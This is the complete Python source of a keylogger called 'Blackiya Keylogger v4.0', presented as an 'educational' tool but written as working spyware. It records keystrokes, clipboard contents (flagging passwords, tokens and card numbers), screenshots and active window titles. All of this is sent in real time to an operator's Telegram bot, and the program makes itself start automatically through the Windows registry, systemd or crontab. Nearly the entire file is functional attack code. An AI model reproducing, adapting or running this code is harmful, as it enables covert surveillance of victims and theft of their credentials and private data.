#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                         BLACKIYA KEYLOGGER v4.0                               ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  Author: BlAck1ya                                                             ║
║  GitHub: https://github.com/BlAck1ya/BlackiyaKeylogger                       ║
║  Version: 4.0 (Superfast Edition)                                            ║
║  License: Educational Purpose Only                                           ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  Features:                                                                    ║
║  ✓ Cross-platform (Windows/Linux/macOS/Android)                             ║
║  ✓ Browser keystrokes (Chrome, Firefox, Edge, Brave, Opera)                 ║
║  ✓ Terminal/Console commands capture                                        ║
║  ✓ Superfast batch processing (multiple words together)                     ║
║  ✓ Screenshot capture (no black screens)                                    ║
║  ✓ Clipboard monitoring                                                     ║
║  ✓ Active window tracking                                                   ║
║  ✓ Auto-start persistence                                                   ║
║  ✓ Telegram real-time exfiltration                                          ║
╚═══════════════════════════════════════════════════════════════════════════════╝

FOR EDUCATIONAL PURPOSES ONLY - USE ON YOUR OWN SYSTEMS ONLY
"""

import os
import sys
import time
import threading
import subprocess
import platform
import socket
import getpass
from datetime import datetime

# ==================== CONFIGURATION - CHANGE THESE ====================
# Telegram Setup Instructions:
# 1. Search @BotFather on Telegram -> /newbot -> Create bot -> Copy TOKEN
# 2. Search @userinfobot on Telegram -> /start -> Copy CHAT_ID
# 3. Paste both below:

TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"      # Replace with your chat ID

# Performance Settings
SEND_DELAY = 0.5          # Send after 0.5 seconds of inactivity
MAX_BUFFER = 200          # Max characters before force send
SCREENSHOT_INTERVAL = 45  # Screenshot every 45 seconds
ENABLE_SCREENSHOTS = True
ENABLE_CLIPBOARD = True
ENABLE_PERSISTENCE = True

# Internal paths
HOME_DIR = os.path.expanduser("~")
LOG_DIR = os.path.join(HOME_DIR, ".cache", "blackiya_logs")
os.makedirs(LOG_DIR, exist_ok=True)

# ==================== AUTHOR INFO ====================
__author__ = "BlAck1ya"
__github__ = "https://github.com/BlAck1ya/BlackiyaKeylogger"
__version__ = "4.0"

# ==================== BANNER ====================
BANNER = f"""
╔══════════════════════════════════════════════════════════════════╗
║                    BLACKIYA KEYLOGGER v{__version__}                      ║
╠══════════════════════════════════════════════════════════════════╣
║  Author : {__author__}                                              ║
║  GitHub : {__github__}                             ║
║  Type   : Educational Security Tool                            ║
╠══════════════════════════════════════════════════════════════════╣
║  [!] Use only on your own systems                              ║
║  [!] Unauthorized use is illegal                               ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ==================== DEPENDENCY CHECK & INSTALL ====================
def install_dependencies():
    """Auto-install missing dependencies"""
    required = ['requests', 'pynput']
    optional = ['pillow', 'pyperclip', 'mss']
    
    for package in required + optional:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
            except:
                pass

install_dependencies()

# ==================== IMPORTS ====================
try:
    import requests
    REQUESTS_OK = True
except:
    REQUESTS_OK = False

try:
    from pynput import keyboard
    PYNPUT_OK = True
except:
    PYNPUT_OK = False

try:
    import mss
    import mss.tools
    MSS_OK = True
except:
    MSS_OK = False

try:
    import pyperclip
    CLIPBOARD_OK = True
except:
    CLIPBOARD_OK = False

# ==================== TELEGRAM FUNCTIONS ====================
def tg_send(text):
    """Send message to Telegram"""
    if not REQUESTS_OK or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        for i in range(0, len(text), 4000):
            chunk = text[i:i+4000]
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=10)
        return True
    except:
        return False

def tg_send_file(filepath, caption=""):
    """Send file to Telegram"""
    if not REQUESTS_OK:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, 
                         files={"document": f}, timeout=30)
        return True
    except:
        return False

# ==================== SYSTEM INFORMATION ====================
def get_system_info():
    """Collect system information"""
    try:
        hostname = socket.gethostname()
        username = getpass.getuser()
        os_info = f"{platform.system()} {platform.release()}"
        machine = platform.machine()
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
        except:
            ip = "Unknown"
        
        info = f"""
🚀 BLACKIYA KEYLOGGER v{__version__} ACTIVATED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 Author: {__author__}
🖥️  Hostname: {hostname}
👤 Username: {username}
💿 OS: {os_info}
🖨️ Machine: {machine}
🌐 IP: {ip}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Status: MONITORING ACTIVE
⚡ Mode: Superfast Batch Processing
"""
        return info
    except:
        return "Blackiya Keylogger Active"

# ==================== ACTIVE WINDOW TRACKER ====================
_last_window = ""
_last_window_time = 0
_window_cache_time = 0.5

def get_active_window():
    """Get current active window title with caching"""
    global _last_window, _last_window_time
    
    now = time.time()
    if now - _last_window_time < _window_cache_time:
        return _last_window
    
    system = platform.system()
    
    try:
        if system == "Windows":
            try:
                import win32gui
                window = win32gui.GetForegroundWindow()
                _last_window = win32gui.GetWindowText(window) or "Unknown"
                _last_window_time = now
                return _last_window
            except:
                pass
                
        elif system == "Linux":
            try:
                win_id = subprocess.run(['xdotool', 'getactivewindow'], capture_output=True, text=True, timeout=0.3).stdout.strip()
                if win_id:
                    win_name = subprocess.run(['xdotool', 'getwindowname', win_id], capture_output=True, text=True, timeout=0.3).stdout.strip()
                    _last_window = win_name[:50] if win_name else "Unknown"
                    _last_window_time = now
                    return _last_window
            except:
                pass
                
        elif system == "Darwin":  # macOS
            try:
                result = subprocess.run(['osascript', '-e', 'tell application "System Events" to get name of first application process whose frontmost is true'],
                                      capture_output=True, text=True, timeout=1)
                _last_window = result.stdout.strip() or "Unknown"
                _last_window_time = now
                return _last_window
            except:
                pass
    except:
        pass
    
    return _last_window or "Unknown"

def window_monitor():
    """Monitor active window changes"""
    last = ""
    while True:
        current = get_active_window()
        if current != last and current != "Unknown":
            last = current
            tg_send(f"🪟 **Window Changed**\n`{current[:100]}`")
        time.sleep(2)

# ==================== SCREENSHOT CAPTURE ====================
def capture_screenshot():
    """Capture screenshot using multiple methods"""
    timestamp = int(time.time())
    path = os.path.join(LOG_DIR, f"ss_{timestamp}.png")
    
    system = platform.system()
    
    # Method 1: mss (fastest)
    if MSS_OK:
        try:
            with mss.mss() as sct:
                sct.shot(output=path)
            if os.path.exists(path) and os.path.getsize(path) > 1000:
                return path
        except:
            pass
    
    # Method 2: scrot (Linux)
    if system == "Linux":
        try:
            subprocess.run(['scrot', path], timeout=5, capture_output=True)
            if os.path.exists(path) and os.path.getsize(path) > 1000:
                return path
        except:
            pass
    
    # Method 3: gnome-screenshot (Linux)
    if system == "Linux":
        try:
            subprocess.run(['gnome-screenshot', '-f', path], timeout=5)
            if os.path.exists(path) and os.path.getsize(path) > 1000:
                return path
        except:
            pass
    
    # Method 4: PIL/Pillow
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save(path)
        return path
    except:
        pass
    
    return None

def screenshot_loop():
    """Take screenshots periodically"""
    if not ENABLE_SCREENSHOTS:
        return
    
    while True:
        time.sleep(SCREENSHOT_INTERVAL)
        try:
            ss_path = capture_screenshot()
            if ss_path:
                current_win = get_active_window()
                caption = f"📸 **Screenshot**\n🪟 `{current_win[:80]}`\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                tg_send_file(ss_path, caption)
                os.remove(ss_path)
        except:
            pass

# ==================== CLIPBOARD MONITOR ====================
_last_clipboard = ""
_last_clipboard_time = 0

def clipboard_monitor():
    """Monitor clipboard changes"""
    if not ENABLE_CLIPBOARD or not CLIPBOARD_OK:
        return
    
    global _last_clipboard, _last_clipboard_time
    
    while True:
        try:
            current = pyperclip.paste()
            if current and current != _last_clipboard and len(current) > 5:
                now = time.time()
                if now - _last_clipboard_time > 1:
                    _last_clipboard = current
                    _last_clipboard_time = now
                    
                    sensitive = any(w in current.lower() for w in 
                                  ['password', 'pass', 'secret', 'key', 'token', 'credit', 'card'])
                    icon = "🔐" if sensitive else "📋"
                    
                    message = f"{icon} **CLIPBOARD**\n━━━━━━━━━━━━━━━━━━━━━━\n```\n{current[:1000]}\n```"
                    tg_send(message)
                    
                    if len(current) > 1000:
                        path = os.path.join(LOG_DIR, f"clip_{int(time.time())}.txt")
                        with open(path, 'w', encoding='utf-8') as f:
                            f.write(current)
                        tg_send_file(path, "Clipboard content (large)")
                        os.remove(path)
        except:
            pass
        time.sleep(2)

# ==================== KEYLOGGER ====================
class BlackiyaKeylogger:
    """Main keylogger class"""
    
    def __init__(self):
        self.key_buffer = []
        self.last_key_time = time.time()
        self.current_line = ""
        self.running = True
        self.lock = threading.Lock()
        self.total_keys = 0
        
    def add_key(self, key_char, window):
        """Add key to buffer with batching"""
        with self.lock:
            self.key_buffer.append(key_char)
            self.current_line += key_char
            self.last_key_time = time.time()
            self.total_keys += 1
            
            if len(self.key_buffer) >= MAX_BUFFER:
                self.flush()
    
    def flush(self):
        """Send all buffered keys at once"""
        with self.lock:
            if not self.key_buffer:
                return
            
            full_text = ''.join(self.key_buffer)
            current_window = get_active_window()
            
            # Detect browser
            browsers = ['chrome', 'firefox', 'edge', 'brave', 'opera', 'safari', 'browser']
            is_browser = any(b in current_window.lower() for b in browsers)
            icon = "🌐" if is_browser else "💻"
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            message = f"{icon} **[{timestamp}]** `{current_window[:45]}`\n```\n{full_text}\n```"
            
            tg_send(message)
            
            # Local logging
            with open(os.path.join(LOG_DIR, "keystrokes.log"), "a", encoding='utf-8') as f:
                f.write(f"{timestamp} [{current_window[:45]}] {full_text}\n")
                f.flush()
            
            self.key_buffer = []
            self.current_line = ""
    
    def start(self):
        """Start the keylogger"""
        
        # Method 1: evdev (Linux - best performance)
        if platform.system() == "Linux":
            try:
                from evdev import InputDevice, ecodes
                import glob
                
                for dev_path in glob.glob('/dev/input/event*'):
                    try:
                        device = InputDevice(dev_path)
                        if 'keyboard' in device.name.lower() or 'kbd' in device.name.lower():
                            print(f"[✓] Blackiya Keylogger active on: {device.name}")
                            self._evdev_loop(device)
                            return True
                    except:
                        pass
            except ImportError:
                pass
        
        # Method 2: pynput (cross-platform fallback)
        if PYNPUT_OK:
            print("[✓] Blackiya Keylogger active (pynput mode)")
            listener = keyboard.Listener(on_press=self._pynput_callback)
            listener.start()
            return True
        
        print("[✗] Blackiya Keylogger failed to start")
        return False
    
    def _evdev_loop(self, device):
        """EVDEV capture loop"""
        from evdev import ecodes
        
        key_map = {
            ecodes.KEY_ENTER: "\n",
            ecodes.KEY_SPACE: " ",
            ecodes.KEY_TAB: "    ",
            ecodes.KEY_BACKSPACE: "",
            ecodes.KEY_LEFT: "",
            ecodes.KEY_RIGHT: "",
            ecodes.KEY_UP: "",
            ecodes.KEY_DOWN: "",
        }
        
        # Auto-flush timer
        def timer_check():
            while self.running:
                time.sleep(0.3)
                if time.time() - self.last_key_time > SEND_DELAY and self.key_buffer:
                    self.flush()
        
        threading.Thread(target=timer_check, daemon=True).start()
        
        # Main capture loop
        for event in device.read_loop():
            if not self.running:
                break
            
            if event.type == ecodes.EV_KEY and event.value == 1:  # Key press
                key_code = event.code
                
                if key_code in key_map:
                    key_char = key_map[key_code]
                    if key_char == "":  # Backspace etc
                        with self.lock:
                            if self.key_buffer:
                                self.key_buffer.pop()
                                if self.current_line:
                                    self.current_line = self.current_line[:-1]
                        continue
                else:
                    try:
                        key_name = ecodes.KEY[key_code].replace('KEY_', '').lower()
                        if len(key_name) == 1:
                            key_char = key_name
                        elif key_name in ['leftctrl', 'rightctrl', 'leftalt', 'rightalt', 'leftshift', 'rightshift']:
                            continue
                        else:
                            key_char = f" [{key_name.upper()}] "
                    except:
                        continue
                
                current_window = get_active_window()
                self.add_key(key_char, current_window)
    
    def _pynput_callback(self, key):
        """pynput callback"""
        try:
            if hasattr(key, 'char') and key.char:
                key_char = key.char
            else:
                special = str(key).replace('Key.', '').replace("'", "")
                if special == 'space':
                    key_char = " "
                elif special == 'enter':
                    key_char = "\n"
                elif special == 'backspace':
                    with self.lock:
                        if self.key_buffer:
                            self.key_buffer.pop()
                    return
                else:
                    key_char = f" [{special.upper()}] "
            
            current_window = get_active_window()
            self.add_key(key_char, current_window)
        except:
            pass

# ==================== PERSISTENCE ====================
def setup_persistence():
    """Setup auto-start on boot"""
    if not ENABLE_PERSISTENCE:
        return
    
    script_path = os.path.abspath(__file__)
    system = platform.system()
    
    if system == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "BlackiyaService", 0, winreg.REG_SZ, 
                            f'pythonw.exe "{script_path}"')
            winreg.CloseKey(key)
            tg_send("✅ Persistence: Windows Registry")
        except:
            pass
    
    elif system == "Linux":
        try:
            service_content = f"""[Unit]
Description=Blackiya Keylogger Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 "{script_path}"
Restart=always
RestartSec=30
User={getpass.getuser()}

[Install]
WantedBy=default.target
"""
            service_path = os.path.expanduser("~/.config/systemd/user/blackiya-keylogger.service")
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            with open(service_path, 'w') as f:
                f.write(service_content)
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "blackiya-keylogger.service"], capture_output=True)
            subprocess.run(["systemctl", "--user", "start", "blackiya-keylogger.service"], capture_output=True)
            tg_send("✅ Persistence: Systemd")
        except:
            try:
                cron_line = f"@reboot /usr/bin/python3 '{script_path}' > /dev/null 2>&1 &"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)
                tg_send("✅ Persistence: Crontab")
            except:
                pass

# ==================== STATS REPORTER ====================
start_time = time.time()

def stats_reporter(keylogger):
    """Send statistics periodically"""
    while True:
        time.sleep(300)  # Every 5 minutes
        try:
            uptime = int(time.time() - start_time)
            message = f"""📊 **BLACKIYA KEYLOGGER STATS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 Total Keys: {keylogger.total_keys}
📦 Buffer: {len(keylogger.key_buffer)}
✅ Status: ACTIVE
⏱️ Uptime: {uptime} seconds
👤 Author: BlAck1ya
━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
            tg_send(message)
        except:
            pass

# ==================== MAIN ====================
def main():
    """Main execution"""
    print(BANNER)
    print(f"[*] Starting Blackiya Keylogger v{__version__}")
    print(f"[*] Author: {__author__}")
    print(f"[*] GitHub: {__github__}")
    print("-" * 60)
    
    # Check configuration
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
        print("""
        ⚠️  CONFIGURATION REQUIRED!
        
        Please edit the script and set:
        TELEGRAM_BOT_TOKEN = "your_bot_token_here"
        TELEGRAM_CHAT_ID = "your_chat_id_here"
        
        To get credentials:
        1. Telegram → @BotFather → /newbot → Create bot → Copy TOKEN
        2. Telegram → @userinfobot → /start → Copy CHAT_ID
        
        Then run the script again.
        """)
        sys.exit(1)
    
    # Send startup message
    tg_send(get_system_info())
    
    # Start window tracker
    threading.Thread(target=window_monitor, daemon=True).start()
    print("[✓] Window Tracker: ACTIVE")
    
    # Start keylogger
    keylogger = BlackiyaKeylogger()
    if keylogger.start():
        print("[✓] Keylogger: ACTIVE")
    else:
        print("[✗] Keylogger: FAILED")
        return
    
    # Start clipboard monitor
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    print("[✓] Clipboard Monitor: ACTIVE")
    
    # Start screenshot loop
    threading.Thread(target=screenshot_loop, daemon=True).start()
    print(f"[✓] Screenshot Capture: ACTIVE (every {SCREENSHOT_INTERVAL}s)")
    
    # Start stats reporter
    threading.Thread(target=stats_reporter, args=(keylogger,), daemon=True).start()
    print("[✓] Stats Reporter: ACTIVE (every 5 min)")
    
    # Setup persistence
    setup_persistence()
    print("[✓] Persistence: CONFIGURED")
    
    print("""
    ┌─────────────────────────────────────────────────────────────┐
    │  ✅ BLACKIYA KEYLOGGER IS RUNNING                          │
    ├─────────────────────────────────────────────────────────────┤
    │  📝 Test: Type "Hello World" in any application            │
    │  🌐 Browser: Chrome/Firefox keystrokes captured            │
    │  💻 Terminal: All commands logged                          │
    │  📸 Screenshots: Every 45 seconds                          │
    │  📋 Clipboard: Auto-capture on copy                        │
    │                                                             │
    │  📊 Check Telegram for live data                           │
    │  🛑 Press Ctrl+C to stop                                   │
    └─────────────────────────────────────────────────────────────┘
    """)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping Blackiya Keylogger...")
        tg_send(f"""🔴 **BLACKIYA KEYLOGGER STOPPED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Total Keys: {keylogger.total_keys}
⏱️ Uptime: {int(time.time() - start_time)} seconds
👤 Author: BlAck1ya
━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
        print("[✓] Blackiya Keylogger stopped cleanly")
        sys.exit(0)

if __name__ == "__main__":
    main()
